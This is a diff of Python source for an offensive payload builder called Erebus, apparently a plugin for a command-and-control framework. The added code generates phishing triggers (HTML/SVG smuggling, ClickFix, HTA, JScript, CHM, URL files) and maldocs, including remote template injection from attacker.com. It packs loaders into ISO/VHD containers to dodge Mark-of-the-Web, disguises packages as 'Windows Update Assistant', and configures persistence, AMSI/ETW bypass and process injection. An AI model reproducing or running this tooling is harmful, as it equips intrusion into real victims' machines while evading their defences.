+        _TECHNIQUE_MAP = [
+            # Trigger / delivery
+            ("2.0 Trigger Type", "HTML",       [("T1027.006", "HTML Smuggling")]),
+            ("2.0 Trigger Type", "SVG",        [("T1027.006", "SVG Smuggling")]),
+            ("2.0 Trigger Type", "BAT",        [("T1059.003", "Windows Command Shell")]),
+            ("2.0 Trigger Type", "HTA",        [("T1218.005", "Mshta")]),
+            ("2.0 Trigger Type", "ClickFix",   [("T1204.002", "User Execution: Malicious File")]),
+            ("2.0 Trigger Type", "URL",        [("T1204.002", "User Execution: Malicious File")]),
+            ("2.0 Trigger Type", "JS",         [("T1059.007", "JavaScript")]),
+            ("2.0 Trigger Type", "CHM",        [("T1218.001", "Compiled HTML File")]),
+            ("2.0 Trigger Type", "MSI",        [("T1218.007", "Msiexec")]),
+            ("2.0 Trigger Type", "LNK",        [("T1204.002", "User Execution: Malicious File")]),
+            ("2.0 Trigger Type", "MSC",        [("T1218.014", "MMC")]),
+            # Container
+            ("3.0 Container Type", "ISO",      [("T1553.005", "Mark-of-the-Web Bypass")]),
+            ("3.0 Container Type", "VHD",      [("T1553.005", "Mark-of-the-Web Bypass")]),
+            ("3.0 Container Type", "Zip",      [("T1027",     "Obfuscated Files or Information")]),
+            ("3.0 Container Type", "7z",       [("T1027",     "Obfuscated Files or Information")]),
+            # Injection type
+            ("0.4 Shellcode Loader - Injection Type", "1", [("T1055.003", "Process Injection: Thread Execution Hijacking")]),
+            ("0.4 Shellcode Loader - Injection Type", "2", [("T1055",     "Process Injection")]),
+            ("0.4 Shellcode Loader - Injection Type", "3", [("T1055.004", "Asynchronous Procedure Call")]),
+            ("0.4 Shellcode Loader - Injection Type", "4", [("T1055.015", "ListPlanting / Thread Pool Injection")]),
+            ("0.4 Shellcode Loader - Injection Type", "5", [("T1055.004", "Asynchronous Procedure Call")]),
+            ("0.4 Shellcode Loader - Injection Type", "6", [("T1055.013", "Process Doppelgänging / Module Stomping")]),
+            ("0.4 Shellcode Loader - Injection Type", "7", [("T1055",     "KernelCallbackTable Hijack")]),
+            ("0.4 Shellcode Loader - Injection Type", "8", [("T1055.012", "Process Hollowing (TxF)")]),
+            # Obfuscation
+            ("0.0c Enable Donut", True,        [("T1027.009", "Embedded Payloads (Donut PE→shellcode)")]),
+            # Evasion
+            ("0.5a Enable Guardrails", True,   [("T1480.001", "Execution Guardrails: Environmental Keying")]),
+            ("0.5n Callstack Spoofing", True,  [("T1036",     "Masquerading (Callstack Spoof)")]),
+            ("6.0 Codesign Loader", True,      [("T1553.002", "Code Signing")]),
+            # Infra
+            ("7.0 Generate Redirector Configs", True, [("T1090.002", "External Proxy / Redirector")]),
+            # Maldoc
+            ("0.9 Create MalDoc", "Excel (XLSM)", [("T1566.001", "Spearphishing Attachment"), ("T1137.001", "Office Template Macros")]),
+            ("0.9 Create MalDoc", "Excel (XLL)",  [("T1566.001", "Spearphishing Attachment"), ("T1559.002", "DDE / Add-In")]),
+            ("0.9 Create MalDoc", "VBA",           [("T1566.001", "Spearphishing Attachment"), ("T1137.001", "Office Template Macros")]),
+        ]
+
+        lines = [
+            "=" * 72,
+            "EREBUS WRAPPER - ATT&CK TECHNIQUE COVERAGE",
+            "=" * 72,
+            f"Build time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
+            "",
+            f"{'Technique ID':<16} {'Technique Name':<42} {'Build Parameter'}",
+            "-" * 72,
+        ]
+
+        seen: set = set()
+        for param_name, match_val, techniques in _TECHNIQUE_MAP:
+            try:
+                actual = self.get_parameter(param_name)
+            except Exception:
+                continue
+            if match_val is True:
+                triggered = bool(actual)
+            else:
+                triggered = (str(actual) == str(match_val))
+            if not triggered:
+                continue
+            for tid, tname in techniques:
+                key = (tid, param_name)
+                if key in seen:
+                    continue
+                seen.add(key)
+                short_param = param_name.split(" ", 1)[-1] if " " in param_name else param_name
+                lines.append(f"{tid:<16} {tname:<42} {short_param}")
+
+        # Always-present techniques (any Erebus loader build)
+        always = [
+            ("T1027",     "Obfuscated Files or Information",   "Shellcode obfuscation pipeline"),
+            ("T1620",     "Reflective Code Loading",           "In-memory loader execution"),
+        ]
+        for tid, tname, note in always:
+            if tid not in {k for k, _ in seen}:
+                lines.append(f"{tid:<16} {tname:<42} {note}")
+
+        lines += [
+            "",
+            "-" * 72,
+            f"Total techniques: {len(seen) + len(always)}",
+            "Reference: https://attack.mitre.org",
+        ]
+
+        try:
+            with open(output_path, "w", encoding="utf-8") as f:
+                f.write("\n".join(lines) + "\n")
+        except Exception as e:
+            print(f"[!] Failed to write attack_coverage.txt: {e}")
+
     async def obfuscate_vba(self, vba_code):
         """Obfuscate VBA code locally or via plugin"""
         try:
@@ -2174,8 +2786,255 @@ generated if none have been entered.""",
         output_path.parent.mkdir(parents=True, exist_ok=True)
         output_path.write_text("\n".join(sections), encoding="utf-8")
 
-    async def containerise_payload(self,agent_build_path):
-        """Creates a container and adds all files generated from the payload function inside of the given archive/media"""
+    async def _build_all_variants(self, agent_build_path: str) -> bytes:
+        """Build one artifact per trigger type and per container type.
+
+        Called when "0.0g Build All Configurations" is enabled. The compiled
+        loader must already exist in agent_build_path/payload/ before this
+        runs. Returns raw bytes of a master ZIP containing:
+            triggers/<TYPE>/payload_<type>.zip  - trigger variant ZIPs
+            containers/<TYPE>/payload.<ext>      - container variant files
+            MANIFEST.txt                         - build summary
+        """
+        import io
+
+        build_root = Path(agent_build_path)
+        src_payload = build_root / "payload"
+        decoy_dir   = build_root / "decoys"
+        decoy_file  = decoy_dir / "decoy.pdf"
+
+        # Snapshot compiled payload dir so each variant gets a clean copy.
+        snap_root = Path(tempfile.mkdtemp(prefix="erebus_snap_"))
+        snap_payload = snap_root / "payload"
+        if src_payload.exists():
+            shutil.copytree(str(src_payload), str(snap_payload))
+        else:
+            snap_payload.mkdir(parents=True)
+
+        def _fresh_build(tag: str) -> Path:
+            """Return a fresh agent_build_path clone for one variant."""
+            work = Path(tempfile.mkdtemp(prefix=f"erebus_{tag}_"))
+            shutil.copytree(str(snap_payload), str(work / "payload"))
+            if decoy_dir.exists():
+                shutil.copytree(str(decoy_dir), str(work / "decoys"))
+            return work
+
+        def _find_exe(work: Path) -> Path:
+            for ext in ("exe", "dll", "xll"):
+                p = work / "payload" / f"erebus.{ext}"
+                if p.exists():
+                    return p
+            return work / "payload" / "erebus.exe"
+
+        def _zip_dir(src_dir: Path) -> bytes:
+            buf = io.BytesIO()
+            with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
+                for f in sorted(src_dir.rglob("*")):
+                    if f.is_file():
+                        z.write(f, f.relative_to(src_dir))
+            buf.seek(0)
+            return buf.read()
+
+        # Default command used across trigger variants (malleable, operator
+        # can customize via normal parameters on subsequent targeted builds).
+        _cmd_bin  = r"C:\Windows\System32\rundll32.exe"
+        _cmd_args = "erebus.dll,EntryPoint"
+        _cmd_full = f"{_cmd_bin} {_cmd_args}"
+
+        # (tag, callable(work_root) → trigger_path_or_None)
+        trigger_specs = [
+            ("BAT", lambda w: create_bat_payload_trigger(
+                target_bin=_cmd_bin, args=_cmd_args,
+                payload_dir=w / "payload", decoy_file=decoy_file)),
+            ("HTA", lambda w: create_hta_trigger(
+                command=_cmd_full,
+                output_filename="setup.hta",
+                payload_dir=w / "payload",
+                decoy_path=str(decoy_file) if decoy_file.exists() else "")),
+            ("HTML", lambda w: create_html_smuggling_trigger(
+                payload_path=str(_find_exe(w)),
+                output_filename="document.html",
+                download_name=_find_exe(w).name,
+                payload_dir=w / "payload")),
+            ("ClickFix", lambda w: create_clickfix_trigger(
+                command=_cmd_full,
+                output_filename="verify.html",
+                payload_dir=w / "payload")),
+            ("URL", lambda w: create_url_trigger(
+                target_url=r"file://attacker/share/erebus.dll",
+                output_filename="document.url",
+                payload_dir=w / "payload")),
+            ("JS", lambda w: create_jscript_trigger(
+                command=_cmd_full,
+                output_filename="update.js",
+                payload_dir=w / "payload",
+                obfuscate_command=True,
+                decoy_path=str(decoy_file) if decoy_file.exists() else "")),
+            ("CHM", lambda w: create_chm_project(
+                executable=_cmd_bin,
+                arguments=_cmd_args,
+                output_dir=str(w / "payload" / "chm_project"),
+                chm_name="document.chm",
+                title="Help Documentation")),
+            ("SVG", lambda w: create_svg_smuggling_trigger(
+                payload_path=str(_find_exe(w)),
+                output_filename="document.svg",
+                payload_dir=w / "payload",
+                download_name=_find_exe(w).name,
+                obfuscate_b64=True)),
+        ]
+
+        # (tag, callable(work_root) → output_path_or_None)
+        container_specs = [
+            ("Zip", lambda w: build_zip(
+                compression=9, password=None,
+                build_path=w, visible_extension=".bat")),
+            ("7z",  lambda w: build_7z(
+                compression="9", password=None,
+                build_path=w, visible_extension=".bat")),
+            ("ISO", lambda w: build_iso(
+                volume_id="EREBUS", enable_autorun=False,
+                source_iso=None, build_path=w, visible_extension=".bat")),
+            ("VHD", lambda w: build_vhd(
+                build_path=w, visible_extension=".bat",
+                volume_label="EREBUS", output_filename="payload.vhd")),
+        ]
+
+        manifest_lines = [
+            "Erebus - Build All Configurations",
+            f"Generated : {datetime.now().isoformat()}",
+            "",
+            "TRIGGERS (one ZIP per type; contains loader + trigger script):",
+        ]
+
+        master_buf = io.BytesIO()
+        with zipfile.ZipFile(master_buf, "w", zipfile.ZIP_DEFLATED) as mz:
+
+            # ── Trigger variants ──────────────────────────────────────────────
+            for tag, tfn in trigger_specs:
+                work = _fresh_build(tag)
+                try:
+                    tfn(work)
+                    data = _zip_dir(work / "payload")
+                    mz.writestr(f"triggers/{tag}/payload_{tag.lower()}.zip", data)
+                    manifest_lines.append(f"  triggers/{tag}/payload_{tag.lower()}.zip  - OK")
+                except Exception as exc:
+                    mz.writestr(f"triggers/{tag}/ERROR.txt", f"{tag} failed: {exc}")
+                    manifest_lines.append(f"  triggers/{tag}/ERROR.txt           - FAILED: {exc}")
+                finally:
+                    shutil.rmtree(str(work), ignore_errors=True)
+
+            manifest_lines.append("")
+            manifest_lines.append("CONTAINERS (loader + BAT trigger wrapped in each container format):")
+
+            # ── Container variants ────────────────────────────────────────────
+            for tag, cfn in container_specs:
+                work = _fresh_build(f"container_{tag}")
+                try:
+                    # Add a BAT trigger as the baseline execution mechanism
+                    create_bat_payload_trigger(
+                        target_bin=_cmd_bin, args=_cmd_args,
+                        payload_dir=work / "payload", decoy_file=decoy_file)
+                    out_path = cfn(work)
+                    if out_path and Path(out_path).exists():
+                        suffix = Path(out_path).suffix
+                        arc_name = f"containers/{tag}/payload_{tag.lower()}{suffix}"
+                        mz.write(str(out_path), arc_name)
+                        manifest_lines.append(f"  {arc_name}  - OK")
+                    else:
+                        mz.writestr(f"containers/{tag}/ERROR.txt", f"{tag}: no output file produced")
+                        manifest_lines.append(f"  containers/{tag}/ERROR.txt  - FAILED: no output")
+                except Exception as exc:
+                    mz.writestr(f"containers/{tag}/ERROR.txt", f"{tag} failed: {exc}")
+                    manifest_lines.append(f"  containers/{tag}/ERROR.txt  - FAILED: {exc}")
+                finally:
+                    shutil.rmtree(str(work), ignore_errors=True)
+
+            mz.writestr("MANIFEST.txt", "\n".join(manifest_lines))
+
+        shutil.rmtree(str(snap_root), ignore_errors=True)
+        master_buf.seek(0)
+        return master_buf.read()
+
+    def _wrap_in_outer_transport(
+        self,
+        inner_path: "Path",
+        outer_type: str,
+    ) -> "Path":
+        """
+        Wrap *inner_path* inside an outer ISO / VHD / ZIP / 7z transport layer.
+
+        Creates a temp staging directory, copies *inner_path* into its
+        ``payload/`` sub-directory, then calls the appropriate container
+        builder.  The file's original extension is preserved so the victim
+        sees the correct icon when browsing the mounted / extracted transport.
+
+        Returns the path to the outer container file.
+        """
+        import tempfile as _tempfile
+        import shutil as _shutil
+
+        staging   = Path(_tempfile.mkdtemp(prefix="erebus_outer_"))
+        pay_stage = staging / "payload"
+        pay_stage.mkdir()
+        _shutil.copy2(str(inner_path), str(pay_stage / inner_path.name))
+
+        inner_ext = inner_path.suffix   # e.g. ".exe", ".msi", ".iso", ".vhd"
+
+        if outer_type == "ZIP":
+            return build_zip(
+                compression=self.get_parameter("3.1 Compression Level"),
+                password=self.get_parameter("3.2 Archive Password"),
+                build_path=staging,
+                visible_extension=inner_ext,
+            )
+        if outer_type == "7z":
+            return build_7z(
+                compression=self.get_parameter("3.1 Compression Level"),
+                password=self.get_parameter("3.2 Archive Password"),
+                build_path=staging,
+                visible_extension=inner_ext,
+            )
+        if outer_type == "ISO":
+            return build_iso(
+                volume_id=self.get_parameter("4.0 ISO Volume ID") or "SETUP",
+                enable_autorun=False,          # outer ISO is a transport; no autorun
+                source_iso=None,
+                build_path=staging,
+                visible_extension=inner_ext,
+            )
+        if outer_type == "VHD":
+            return build_vhd(
+                build_path=staging,
+                visible_extension=inner_ext,
+                volume_label=(self.get_parameter("4.0 ISO Volume ID") or "SETUP")[:11].upper(),
+                output_filename="payload.vhd",
+            )
+
+        return inner_path   # outer_type == "None" or unknown
+
+    async def containerise_payload(self, agent_build_path):
+        """
+        Build the inner container then optionally wrap it in an outer transport.
+
+        Inner container  = "3.0 Container Type"  (Electron, MSI, ISO, VHD, ZIP, 7z, AppInstaller)
+        Outer transport  = "3.0T Outer Transport" (None, ISO, VHD, ZIP, 7z)
+
+        Electron and MSI are self-extracting / self-executing containers: the NSIS
+        installer (Electron) copies the payload to %TEMP% and spawns it; the MSI
+        CustomAction launches it after InstallFinalize.  When an outer transport is
+        selected those self-extracting executables are simply wrapped inside the
+        chosen archive or disk image so the victim double-clicks the transport,
+        extracts or mounts it, and then runs the inner EXE/MSI.
+        """
+        inner_path = await self._build_inner_container(agent_build_path)
+        outer = (self.get_parameter("3.0T Outer Transport") or "None").strip()
+        if inner_path and outer != "None":
+            inner_path = self._wrap_in_outer_transport(inner_path, outer)
+        return inner_path
+
+    async def _build_inner_container(self, agent_build_path):
+        """Build and return the primary (inner) container file path."""
 
         ext_source = self.get_parameter("0.8 Output Extension Source")
         if ext_source == "MalDoc":
@@ -2184,7 +3043,13 @@ generated if none have been entered.""",
                 target_ext = ".bas"
             else:
                 _fmt = (self.get_parameter("0.9p MalDoc Output Format") or "xlsm").lower()
-                target_ext = f".{_fmt}" if _fmt in ("xlsm", "xlsx", "xlam", "docm", "doc") else ".xlsm"
+                _ext_map = {
+                    "xlsm": ".xlsm", "xlsx": ".xlsx", "xlam": ".xlam",
+                    "docm": ".docm", "doc": ".doc",
+                    "pptm": ".pptm", "ppam": ".ppam",
+                    "docx-remote-template": ".docx",
+                }
+                target_ext = _ext_map.get(_fmt, ".xlsm")
         else:
             target_ext = f".{self.get_parameter('0.9 Trigger Type').lower()}"
 
@@ -2298,6 +3163,20 @@ generated if none have been entered.""",
                     "debugMode": bool(self.get_parameter("3.E9q Guardrail Debug Mode")),
                 }
 
+                _persist_method_map = {
+                    "Registry Run Key":  "registry_run",
+                    "Registry RunOnce":  "registry_run_once",
+                    "Startup Folder":    "startup_folder",
+                    "Scheduled Task":    "scheduled_task",
+                }
+                _persist_install_dir_raw = self.get_parameter("3.P3 Persistence Install Dir") or "%APPDATA%"
+                persistence_cfg = {
+                    "enabled":    bool(self.get_parameter("3.P0 Enable Persistence")),
+                    "method":     _persist_method_map.get(self.get_parameter("3.P1 Persistence Method") or "", "registry_run"),
+                    "name":       self.get_parameter("3.P2 Persistence Name") or "",
+                    "installDir": "localappdata" if "LOCAL" in _persist_install_dir_raw.upper() else "appdata",
+                }
+
                 return build_electron_installer(
                     build_path=Path(agent_build_path),
                     product=self.get_parameter("3.E0 Electron Product Name"),
@@ -2311,7 +3190,39 @@ generated if none have been entered.""",
                     copyright_str=self.get_parameter("3.E8 Electron Copyright") or "",
                     custom_icon_bytes=custom_icon_bytes,
                     guardrails=guardrails_cfg,
+                    persistence=persistence_cfg,
                 )
+
+            case "VHD":
+                # Fixed VHD: FAT16 disk image + 512-byte VHD footer.
+                # Files inside a mounted VHD do NOT inherit MOTW from the download.
+                # Bypasses ISO-blocking policies; mounts on double-click in Explorer.
+                return build_vhd(
+                    build_path=Path(agent_build_path),
+                    visible_extension=target_ext,
+                    volume_label=(self.get_parameter("4.0 ISO Volume ID") or "EREBUS")[:11].upper(),
+                    output_filename="payload.vhd",
+                )
+
+            case "AppInstaller":
+                # Generate .appinstaller manifest + MSIX package structure.
+                # Operator must: run build_msix.bat on Windows, upload MSIX to
+                # the hosting URL, then deliver setup.appinstaller to victim.
+                ai_path = build_appinstaller(
+                    build_path=Path(agent_build_path),
+                    msix_uri=str(self.get_parameter("3.AI0 MSIX Hosting URL")),
+                    package_name=str(self.get_parameter("3.AI1 MSIX Package Name") or "Microsoft.WindowsUpdate"),
+                    display_name=str(self.get_parameter("3.AI2 MSIX Display Name") or "Windows Update Assistant"),
+                )
+                # Also produce the MSIX package structure for operator to sign & host
+                payload_dir = Path(agent_build_path) / "payload"
+                build_msix_structure(
+                    build_path=Path(agent_build_path),
+                    payload_files=list(payload_dir.iterdir()) if payload_dir.exists() else [],
+                    package_name=str(self.get_parameter("3.AI1 MSIX Package Name") or "Microsoft.WindowsUpdate"),
+                    display_name=str(self.get_parameter("3.AI2 MSIX Display Name") or "Windows Update Assistant"),
+                )
+                return ai_path
 
         return None
 
@@ -2447,6 +3358,44 @@ generated if none have been entered.""",
             response.build_message = "Files Gathered for Modification."
             await self._build_step("[T1005] - Gathering Files", "Gathered files to obfuscate shellcode", success=True)
 
+            # ===== Donut PE → Shellcode Conversion =====
+            donut_enabled = self.get_parameter("0.0c Enable Donut")
+            if donut_enabled:
+                donut_uuid = self.get_parameter("0.0d Donut Input File")
+                if not donut_uuid:
+                    await self._fail_step(response, "[T1027] - Donut Conversion",
+                        "Donut is enabled but no input file was uploaded.",
+                        "Donut enabled but no PE/DLL file provided.")
+                    return response
+
+                donut_resp = await SendMythicRPCFileGetContent(
+                    MythicRPCFileGetContentMessage(AgentFileId=donut_uuid)
+                )
+                if not donut_resp.Success or not donut_resp.Content:
+                    await self._fail_step(response, "[T1027] - Donut Conversion",
+                        "Failed to retrieve Donut input file from Mythic.",
+                        "Failed to retrieve Donut input file.")
+                    return response
+
+                donut_input_path = str(PurePath(agent_build_path) / "shellcode" / "donut_input.bin")
+                with open(donut_input_path, "wb") as f:
+                    f.write(donut_resp.Content)
+
+                donut_ok, donut_msg = donut_convert(
+                    input_path=donut_input_path,
+                    output_path=mythic_shellcode_path,
+                    arch=self.get_parameter("0.0e Donut Architecture") or "x64",
+                    args=self.get_parameter("0.0f Donut Args") or "",
+                )
+                if not donut_ok:
+                    await self._fail_step(response, "[T1027] - Donut Conversion",
+                        f"Donut conversion failed: {donut_msg}",
+                        f"Donut failed: {donut_msg}")
+                    return response
+
+                output += f"[+] {donut_msg}\n"
+                await self._build_step("[T1027] - Donut Conversion", donut_msg, success=True)
+
             ######################### Shellcode Obfuscation Section #########################
             # Defaults for config template rendering (may be updated after shellcrypt output)
             encryption_type_map = {
@@ -2459,16 +3408,17 @@ generated if none have been entered.""",
             encryption_type_value = encryption_type_map.get(self.get_parameter("2.1 Encryption Type"), 0)
             encryption_key_bytes = "0x00"
             encryption_iv_bytes = ", ".join(["0x00"] * 16)
-            with open(str(mythic_shellcode_path), "rb") as f:
-                header = f.read(2)
-                if header == b"\x4d\x5a":
-                    await self._fail_step(response, "[T1027] - Header Check",
-                        "Supplied payload is a PE instead of raw shellcode.",
-                        "Found leading MZ header - supplied file was not shellcode")
-                    return response
-            response.status = BuildStatus.Success
-            response.build_message = "No leading MZ header found in payload."
-            await self._build_step("[T1027] - Header Check", "No leading MZ header found in payload", success=True)
+            if not donut_enabled:
+                with open(str(mythic_shellcode_path), "rb") as f:
+                    header = f.read(2)
+                    if header == b"\x4d\x5a":
+                        await self._fail_step(response, "[T1027] - Header Check",
+                            "Supplied payload is a PE instead of raw shellcode.",
+                            "Found leading MZ header - supplied file was not shellcode")
+                        return response
+                response.status = BuildStatus.Success
+                response.build_message = "No leading MZ header found in payload."
+                await self._build_step("[T1027] - Header Check", "No leading MZ header found in payload", success=True)
 
             # R2a: command construction lives in plugin_shellcode_obfuscation
             # (pure function in archive/shellcode_obfuscation.py). The async
@@ -2719,6 +3669,13 @@ generated if none have been entered.""",
                                 parse_csv(self.get_parameter("0.5o Callstack Spoof Modules"))
                                 or ["ntdll.dll", "kernel32.dll", "kernelbase.dll"]
                             ),
+                            sleep_obfuscation_type={"None": 0, "Timer": 1, "Ekko-lite": 2}.get(
+                                self.get_parameter("0.5p Sleep Obfuscation"), 0),
+                            sleep_obfuscation_base_ms=int(self.get_parameter("0.5q Sleep Base MS") or 5000),
+                            sleep_obfuscation_jitter_ms=int(self.get_parameter("0.5r Sleep Jitter MS") or 3000),
+                            amsi_bypass_type=int(self.get_parameter("0.5s AMSI Bypass Type") or 1),
+                            etw_bypass_type=int(self.get_parameter("0.5t ETW Bypass Type") or 1),
+                            unhook_scope=int(self.get_parameter("0.5u Unhook Scope") or 0),
                         )
                         rendered_config = config_template.render(**config_data)
 
@@ -2904,6 +3861,9 @@ generated if none have been entered.""",
                             parse_csv(self.get_parameter("0.5o Callstack Spoof Modules"))
                             or ["ntdll.dll", "kernel32.dll", "kernelbase.dll"]
                         ),
+                        sleep_obfuscation_type=0,
+                        sleep_obfuscation_base_ms=0,
+                        sleep_obfuscation_jitter_ms=0,
                     )
                     rendered_config = config_template.render(**config_data)
                     config_hpp_destination = str(PurePath(shellcode_loader_path) / "include" / "config.hpp")
@@ -2936,6 +3896,7 @@ generated if none have been entered.""",
                     f"EREBUS_HASH_SEED={_hash_seed}",
                     f"CONFIG_SYSCALL_BACKEND={_sw3}",
                     f"CONFIG_CALLSTACK_SPOOF_ENABLED={_cs}",
+                    "CONFIG_SLEEP_OBFUSCATION_TYPE=0",
                     "all"
                 ]
                 compile_step_name = "[T1027.011] - Compiling DLL Payload"
@@ -2989,6 +3950,13 @@ generated if none have been entered.""",
                         _hash_seed = f"0x{secrets.randbits(32):08X}"
                         _sw3 = 1 if self.get_parameter("0.5m Syscall Backend") == "SysWhispers3" else 0
                         _cs  = 1 if self.get_parameter("0.5n Callstack Spoofing") else 0
+                        _so_type = {"None": 0, "Timer": 1, "Ekko-lite": 2}.get(
+                            self.get_parameter("0.5p Sleep Obfuscation"), 0)
+                        _so_base = int(self.get_parameter("0.5q Sleep Base MS") or 5000)
+                        _so_jitt = int(self.get_parameter("0.5r Sleep Jitter MS") or 3000)
+                        _amsi    = int(self.get_parameter("0.5s AMSI Bypass Type") or 1)
+                        _etw     = int(self.get_parameter("0.5t ETW Bypass Type") or 1)
+                        _unhook  = int(self.get_parameter("0.5u Unhook Scope") or 0)
                         cmd = [
                             "make",
                             "-C",
@@ -2999,6 +3967,12 @@ generated if none have been entered.""",
                             f"EREBUS_HASH_SEED={_hash_seed}",
                             f"CONFIG_SYSCALL_BACKEND={_sw3}",
                             f"CONFIG_CALLSTACK_SPOOF_ENABLED={_cs}",
+                            f"CONFIG_SLEEP_OBFUSCATION_TYPE={_so_type}",
+                            f"CONFIG_SLEEP_OBFUSCATION_BASE_MS={_so_base}",
+                            f"CONFIG_SLEEP_OBFUSCATION_JITTER_MS={_so_jitt}",
+                            f"CONFIG_AMSI_BYPASS_TYPE={_amsi}",
+                            f"CONFIG_ETW_BYPASS_TYPE={_etw}",
+                            f"CONFIG_UNHOOK_SCOPE={_unhook}",
                             "all"
                         ]
                         if loader_format == "dll":
@@ -3369,7 +4343,8 @@ generated if none have been entered.""",
                             "VirtualAlloc + CreateThread": "createthread",
                             "EnumSystemLocalesA Callback": "enumlocales",
                             "QueueUserAPC Injection": "queueuserapc",
-                            "Process Hollowing": "hollowing"
+                            "Process Hollowing": "hollowing",
+                            "Early-Bird Injection": "earlybird"
                         }
                         loader_type = loader_map.get(self.get_parameter("0.9g VBA Loader Technique"), "createthread")
                         output += f"[DEBUG] Using VBA loader technique: {loader_type}\n"
@@ -3631,7 +4606,44 @@ static size_t key_len = sizeof(key);
                         bas_output = payload_dir / f"{doc_name}_payload.bas"
                         _plugin.export_vba_as_bas(vba_code=vba_code, output_path=str(bas_output), module_name=doc_name)
 
-                        if maldoc_fmt in ("docm", "doc"):
+                        if maldoc_fmt in ("pptm", "ppam"):
+                            # --- PowerPoint path (pure Python, no COM needed) ---
+                            from erebus_wrapper.erebus.modules.plugin_payload_officedoc import PayloadOfficeDocPlugin as _ODP
+                            _odp = _ODP()
+                            ppt_output = payload_dir / f"{doc_name}.{maldoc_fmt}"
+                            if maldoc_fmt == "ppam":
+                                _odp.create_ppam_payload(vba_source=vba_code, output_path=str(ppt_output))
+                                success_msg = (
+                                    f"[+] Created {ppt_output.name} (PowerPoint Add-In).\n"
+                                    "[*] Victim must open .ppam once; PowerPoint then auto-executes on every launch.\n"
+                                    "[*] VBA embedded as .bas sidecar in ppt/vbaProject.bas - inject via olevba/LibreOffice for full VBA.\n"
+                                )
+                            else:
+                                _odp.create_pptm_payload(vba_source=vba_code, output_path=str(ppt_output))
+                                success_msg = (
+                                    f"[+] Created {ppt_output.name} (PowerPoint macro-enabled presentation).\n"
+                                    "[*] VBA embedded as .bas sidecar in ppt/vbaProject.bas - inject via olevba/LibreOffice for full VBA.\n"
+                                )
+                            output += success_msg
+
+                        elif maldoc_fmt == "docx-remote-template":
+                            # --- DOTM remote template injection path ---
+                            from erebus_wrapper.erebus.modules.plugin_payload_officedoc import PayloadOfficeDocPlugin as _ODP
+                            _odp = _ODP()
+                            dotm_url = self.get_parameter("0.9q DOTM Remote URL") or "https://attacker.com/template.dotm"
+                            docx_output = payload_dir / f"{doc_name}.docx"
+                            _odp.create_dotm_template_injection(
+                                template_url=dotm_url,
+                                output_path=str(docx_output),
+                            )
+                            success_msg = (
+                                f"[+] Created {docx_output.name} - fetches DOTM from: {dotm_url}\n"
+                                "[*] Host the DOTM on a redirector; serve 404 after first retrieval to frustrate sandbox re-fetch.\n"
+                                "[*] Pair with ISO/VHD container to suppress MOTW and avoid Protected View.\n"
+                            )
+                            output += success_msg
+
+                        elif maldoc_fmt in ("docm", "doc"):
                             # --- Word path ---
                             # Always produce .docm on server (ZIP-based, no COM needed).
                             # For .doc, build_maldoc.bat converts via Word COM on Windows.
@@ -3953,6 +4965,64 @@ static size_t key_len = sizeof(key);
                                 payload_dir=payload_dir,
                             )
 
+                        case "HTA":
+                            # Combine trigger binary + command into the shell command run
+                            # inside the HTA via WScript.Shell.Run.
+                            # Default: conhost.exe --headless cmd.exe /Q /c payload.exe
+                            trigger_path = create_hta_trigger(
+                                command=(
+                                    f"{self.get_parameter('0.9a Trigger Binary')} "
+                                    f"{self.get_parameter('0.9b Trigger Command')}"
+                                ).strip(),
+                                output_filename="setup.hta",
+                                payload_dir=payload_dir,
+                                decoy_path=str(decoy_file) if decoy_file.exists() else "",
+                            )
+
+                        case "URL":
+                            trigger_path = create_url_trigger(
+                                target_url=str(self.get_parameter("0.9d URL Target")),
+                                output_filename="document.url",
+                                payload_dir=payload_dir,
+                            )
+
+                        case "JS":
+                            trigger_path = create_jscript_trigger(
+                                command=(
+                                    f"{self.get_parameter('0.9a Trigger Binary')} "
+                                    f"{self.get_parameter('0.9b Trigger Command')}"
+                                ).strip(),
+                                output_filename="update.js",
+                                payload_dir=payload_dir,
+                                obfuscate_command=True,
+                                decoy_path=str(decoy_file) if decoy_file.exists() else "",
+                            )
+
+                        case "CHM":
+                            chm_project_dir = create_chm_project(
+                                executable=self.get_parameter("0.9a Trigger Binary") or r"C:\Windows\System32\rundll32.exe",
+                                arguments=self.get_parameter("0.9b Trigger Command") or "",
+                                output_dir=str(payload_dir / "chm_project"),
+                                chm_name="document.chm",
+                                title="Help Documentation",
+                            )
+                            trigger_path = chm_project_dir
+
+                        case "SVG":
+                            _svg_exe = payload_dir / "erebus.exe"
+                            for _ext in ("dll", "cpl", "xll"):
+                                _cand = payload_dir / f"erebus.{_ext}"
+                                if _cand.exists():
+                                    _svg_exe = _cand
+                                    break
+                            trigger_path = create_svg_smuggling_trigger(
+                                payload_path=str(_svg_exe),
+                                output_filename="document.svg",
+                                payload_dir=payload_dir,
+                                download_name=_svg_exe.name,
+                                obfuscate_b64=True,
+                            )
+
                     if trigger_path:
                         response.status = BuildStatus.Success
                         response.build_message = f"{trigger_type} Trigger created!"
@@ -4091,6 +5161,10 @@ static size_t key_len = sizeof(key);
 
             await self._build_step("[T1005] - Gathering Files", f"Generated IOCs tracking file with {len(iocs_list)} hashes", success=True)
 
+            # ATT&CK technique coverage - always generated alongside IOCs
+            attack_coverage_path = os.path.join(payload_dir, "attack_coverage.txt")
+            self.generate_attack_coverage(attack_coverage_path)
+
             ######################### Final Payload / Container #########################
 
             # 1. Capture context for container function
@@ -4102,6 +5176,86 @@ static size_t key_len = sizeof(key);
             self.generated_payload_path = final_path
             self.agent_build_path = agent_build_path
 
+            # Build All mode: produce every trigger + container variant in one ZIP.
+            if self.get_parameter("0.0g Build All Configurations"):
+                await self._build_step("[T1027] - Build All", "Building all trigger and container variants...", success=True)
+                all_bytes = await self._build_all_variants(agent_build_path)
+                response.payload = all_bytes
+                response.updated_filename = "erebus_all_configs.zip"
+                response.status = BuildStatus.Success
+                response.build_message = "Build All: all trigger + container variants bundled into erebus_all_configs.zip"
+                await self._build_step("[T1027] - Build All", "All variants bundled into erebus_all_configs.zip", success=True)
+                return response
+
+            # Redirector config generation (optional, bundled into output ZIP alongside payload)
+            if self.get_parameter("7.0 Generate Redirector Configs"):
+                try:
+                    _redir_out = Path(agent_build_path) / "redirector_configs"
+                    generate_redirector_configs(
+                        output_dir=str(_redir_out),
+                        teamserver_url=self.get_parameter("7.1 Redirector Team Server URL") or "https://10.0.0.5:8443",
+                        server_name=self.get_parameter("7.2 Redirector Public Domain") or "cdn.example.com",
